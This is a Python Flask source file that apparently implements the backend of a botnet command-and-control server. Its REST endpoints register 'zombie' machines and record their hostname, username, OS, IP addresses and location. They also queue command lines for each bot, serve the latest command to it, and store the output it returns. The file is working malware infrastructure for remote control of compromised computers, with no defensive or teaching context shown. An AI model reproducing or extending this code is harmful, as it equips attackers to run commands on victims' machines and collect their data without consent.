
from flask import Blueprint, request
from datetime import datetime as dt

from models.bot import Bot
from models.command import Command

from schemas.command import cmd_schema

from utils.database import database

bots = Blueprint("bots", __name__)


# Success Code: 0 (Evasive Mistake) -> 1 (Success) 


@bots.route("/api/bot", methods=["POST"])
def add_bot():

    success_code = 0

    requests_data = request.get_json()  

    zombie_exists = database.session.query(Bot.uuid) \
        .filter_by(uuid=requests_data["uuid"]) \
        .first() is not None

    if zombie_exists:

        return { "success": success_code }

    bot = Bot(**requests_data)

    try: 
        
        database.session.add(bot)
        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>", methods=["PUT"])
def update_bot(uuid):

    success_code = 0

    bot = Bot.query.get(uuid)

    if not bot:

        return { "success": success_code }

    requests_data = request.get_json()

    bot.hostname = requests_data["hostname"]
    bot.username = requests_data["username"]
    bot.os = requests_data["os"]
    bot.remote_ip = requests_data["remote_ip"]
    bot.datetime = dt.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.local_ip = requests_data["local_ip"]
    bot.state = requests_data["state"]
    bot.location = requests_data["location"]

    try: 

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>", methods=["DELETE"])
def delete_bot(uuid):

    success_code = 0

    bot = Bot.query.get(uuid)

    if not bot:

        return { "success": success_code }

    try: 

        database.session.delete(bot)

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>/command", methods=["GET"])
def get_command(uuid):

    bot = Bot.query.get(uuid)

    if not bot:

        return { "success": 0 }

    # Get last command

    cmd = bot.commands.order_by(Command.timestamp.desc()).first()

    return cmd_schema.jsonify(cmd)


@bots.route("/api/bot/<uuid>/command", methods=["POST"])
def push_command(uuid):

    success_code = 0

    requests_data = request.get_json()

    cmd = Command(bot_uuid=uuid, line=requests_data["line"], output=requests_data["output"])

    try: 

        database.session.add(cmd)
        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>/command", methods=["PUT"])
def update_output_from_command(uuid):

    success_code = 0

    bot = Bot.query.get(uuid)

    if not bot:

        return { "success": 0 }

    # Get last command

    # { "output": "lalalalalalalal" } 

    requests_data = request.get_json()

    cmd = bot.commands.order_by(Command.timestamp.desc()).first()

    if requests_data.get("line"):

        cmd.line = requests_data["line"]
    
    if requests_data.get("output"):

        cmd.output = requests_data["output"]

    try: 

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }


@bots.route("/api/bot/<uuid>/command", methods=["DELETE"])
def delete_command(uuid):

    success_code = 0

    bot = Bot.query.get(uuid)

    if not bot:

        return { "success": 0 }

    # Get last command

    cmd = bot.commands.order_by(Command.timestamp.desc()).first()

    try: 

        database.session.delete(cmd)

        database.session.commit()

        success_code = 1

    except Exception:

        database.session.rollback()

    finally:

        return { "success": success_code }